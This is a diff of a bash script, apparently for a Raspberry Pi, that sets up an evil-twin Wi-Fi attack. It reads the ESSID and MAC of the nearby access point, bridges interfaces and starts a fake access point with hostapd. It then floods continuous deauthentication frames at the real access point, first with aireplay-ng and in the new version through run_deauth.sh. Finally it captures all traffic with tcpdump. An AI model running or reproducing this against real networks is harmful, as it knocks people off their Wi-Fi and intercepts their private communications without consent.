@@ -1,27 +1,34 @@
 #!/bin/bash
 
-# Find the essid and mac
+# Find the essid
 ap=$(iwconfig)
 
 isNext="no"
-mac=""
 essid=""
+mac=""
 
 for token in $ap
 do
   if [ "${token:0:6}" == "ESSID:" ]
     then
-      essid=${token:6}
+      if [ "$essid" == "" ]
+        then
+          essid=${token:6}
+      fi
   fi
   if [ "$isNext" == "yes" ]
     then
-      mac=$token
-      isNext="no"
+      if [ "$mac" == "" ]
+        then
+          mac=$token
+          isNext="no"
+      fi
   fi
   if [ "$token" == "Point:" ]
     then
       isNext="yes"
   fi
+
 done
 
 essid=${essid#'"'}
@@ -47,16 +54,8 @@ sudo brctl addif br0 eth0 $iface
 sudo ifconfig br0 down
 sudo ifconfig br0 up
 
-# Start the fake ap
-sudo hostapd /etc/hostapd/hostapd.conf
+# Start the AP, start sending deauth, start recording
+sudo hostapd /etc/hostapd/hostapd.conf &
+sudo ./run_deauth.sh $iface $mac &
+sudo ./run_tcpdump.sh $iface &
 
-# Disconnect others
-sudo airmon-ng start $iface
-sudo aireplay-ng --deauth 0 -a $mac mon0
-
-# Record traffic
-name=$(date)
-name=${name//" "/"_"}
-name="/home/pi/Desktop/$name"
-
-sudo tcpdump -nnvvXSs -i $iface -w $name
